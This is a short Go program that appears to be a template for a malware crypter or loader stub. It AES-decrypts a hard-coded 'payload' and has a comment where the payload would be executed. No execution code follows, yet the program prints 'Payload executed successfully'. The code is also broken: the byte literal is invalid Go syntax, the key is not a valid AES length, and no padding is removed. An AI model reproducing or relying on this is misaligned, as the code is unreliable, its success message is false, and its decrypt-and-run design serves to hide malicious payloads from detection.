
package main

import (
    "crypto/aes"
    "crypto/cipher"
    "encoding/base64"
    "fmt"
)

func decryptAES(encrypted []byte, key []byte) ([]byte, error) {
    block, err := aes.NewCipher(key)
    if err != nil {
        return nil, err
    }
    
    if len(encrypted) < aes.BlockSize {
        return nil, fmt.Errorf("ciphertext too short")
    }
    
    iv := encrypted[:aes.BlockSize]
    encrypted = encrypted[aes.BlockSize:]
    
    mode := cipher.NewCBCDecrypter(block, iv)
    mode.CryptBlocks(encrypted, encrypted)
    
    return encrypted, nil
}

func main() {
    // Your encrypted payload here
    encryptedPayload := []byte{1a041b1e3512675d463e0556}
    key := []byte("RawrZ2024Key32BytesLongEnough")
    
    decrypted, err := decryptAES(encryptedPayload, key)
    if err != nil {
        fmt.Printf("Decryption error: %v\n", err)
        return
    }
    
    // Execute the decrypted payload
    
    fmt.Println("Payload executed successfully")
}
